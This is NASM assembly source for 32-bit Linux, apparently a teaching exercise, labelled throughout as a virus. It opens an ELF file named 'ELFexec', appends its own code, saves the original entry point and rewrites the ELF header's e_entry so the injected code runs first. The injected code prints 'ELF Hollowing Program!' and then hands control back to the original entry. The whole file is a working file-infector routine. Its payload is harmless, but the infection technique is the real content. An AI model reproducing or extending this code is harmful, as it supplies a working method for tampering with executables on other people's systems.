
%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define ELFHDR_size 52
%define ELFHDR_phoff	28
	
	global _start

	section .text
_start:	
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	;CODE START
	
	jmp quietlyManipulateIfELF;

	jmp VirusExit;


quietlyManipulateIfELF:
	open FileName,2,0777; Open the file for reading - eax has fd
	mov [ebp-7],eax; Save fd to ebp-7->-4
	sub ebp, 3;
	read [ebp-4],ebp,4; Read 4 bytes to epb-3->ebp                   
	add ebp, 3;
	cmp byte [ebp-3],0x7F;
	jne VirusExit;
	cmp byte [ebp-2],'E';
	jne VirusExit;
	cmp byte [ebp-1],'L';
	jne VirusExit;
	cmp byte [ebp],'F';
	jne VirusExit;

    ; Get the Entry Point of the ELF
	lseek [ebp-7],24,0; Set file pointer to e_entry
	sub ebp,19;
	read [ebp+12],ebp,4; ebp-19->-16 has original entry point address 
	add ebp,19;

	; Write the Virus Code to the end of the ELF
	lseek [ebp-7],0,2;
	mov [ebp-3],eax; Save file length to epb-3->ebp
	write [ebp-7],virus_start,PreviousEntryPoint-virus_start
    
	; Write the entry point to the end of the ELF
	; so we can return to it after running the virus
	sub ebp,19;
	write [ebp+12],ebp,4; 
	add ebp,19;

	
	; Get the virtual address of the beginning of the ELF (p_vaddr)
	lseek [ebp-7],28,0; Set file pointer to e_phoff
	sub ebp,11;
	read [ebp+4],ebp,4; Read e_phoff to epb-11->-8
	add ebp,11;
	;	
	lseek [ebp-7],[ebp-11],0; Set file pointer to the first program header
	lseek [ebp-7],8,1; Set the file pointer to the header's p_vaddr
	sub ebp,11;
	read [ebp+4],ebp,4; Read p_vaddr to epb-11->-8
	add ebp,11;

	; Calculate the virtual address of the end of the original ELF (where virus starts)
	mov eax, dword [ebp-11]; p_vaddr
	add eax, dword [ebp-3];  + file size = new entry point
	mov [ebp-15],eax; ebp-15->-12 has virtual address of the end of the file

	; Change the entry point to the virus's start
	lseek [ebp-7],24,0; Set file pointer to e_entry
	sub ebp,15;
	write [ebp+8],ebp,4; Update the entry point
	add ebp,15;  

	close [ebp-7]; Close the file
	exit 0;

virus_start:
print_msg:
	
	; Get the address of the string in the infected ELF and write it to STDOUT
	call get_my_loc; ecx has the address of next_i in the infected file
	sub ecx,next_i-OutStr; ecx has the address of OutStr in the infected file
    write 1,ecx,24;

	; Get the address of where previous entry point is stored 
	; in the infected ELF and jump
	call get_my_loc; ecx has the address of next_i in the infected file
	add ecx,PreviousEntryPoint-next_i; ecx has the address of PreviousEntryPoint in the infected file
	jmp [ecx]; Jump to the original entry point

print_msg_end:

VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
	
FileName:	db "ELFexec", 0
OutStr:		db "ELF Hollowing Program!", 10, 0
Failstr:        db "perhaps not", 10 , 0
	

get_my_loc:
	call next_i
next_i:
	pop ecx
	ret	
PreviousEntryPoint: dd VirusExit
virus_end:
